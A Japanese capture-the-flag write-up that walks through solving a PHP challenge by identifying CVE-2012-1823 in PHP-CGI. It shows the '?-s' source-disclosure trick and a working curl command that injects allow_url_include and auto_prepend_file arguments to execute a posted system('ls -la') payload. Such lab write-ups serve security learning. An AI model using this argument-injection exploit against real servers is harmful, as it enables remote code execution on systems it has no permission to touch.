# Hypertext Preprocessor

## 調査
`curl -i`コマンドで謎の文字列が表示されているURLをリクエスト
リクエストした時刻(GMT)と表示されている文字列が関係しそう。

- 3-4桁目:2024？
- 5-6桁目:日付？
- 7-9桁目:GMTと一致。

ただ、先頭の2つの要素が何を表示しているのかが不明。


curlコマンドを実行したレスポンスヘッダを見てみると、「x-powered-by」の文字列があり、
どうやらPHPで動いていて、さらにバージョンが古いので何か仕掛けがありそう。
```
$ curl "https://ctfq.u1tramarine.blue/q12/"  -i
HTTP/2 200
server: nginx
date: Mon, 14 Oct 2024 04:48:26 GMT
content-type: text/html
x-powered-by: PHP/5.4.1
```

そこで、`PHP 2012:1823`という文字列で検索を行ったところ、PHPの脆弱性の番号(CVE)と一致。
この脆弱性について調べてみた。

この脆弱性は、「CGI版PHPにリモートからスクリプト実行」することができる脆弱性、とのこと。

## 解答
この脆弱性を利用して、webページとして表示される前のソースコードを確認する場合は、以下のURLにアクセスする。
https://ctfq.u1tramarine.blue/q12/index.php?-s

表示したところ、以下のプログラムが出力された。
```
<?php

    //  Flag is in this directory.

    date_default_timezone_set('UTC');
    
    $t = '2012:1823:20:';
    $t .= date('y:m:d:H:i:s');
    for($i=0;$i<4;$i++)
        $t .= sprintf(':%02d',mt_rand(0,59));
?>
```

以上より、index.phpがある階層のファイルを確認すれば良さそうなので、bodyとしてPHPプログラムを渡して、
ページが表示される前に、実行されるようにする。

```body.txt
<?php system('ls -la'); exit;
```

この脆弱性を利用して、
curl -d @body.txt "https://ctfq.u1tramarine.blue/q12/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"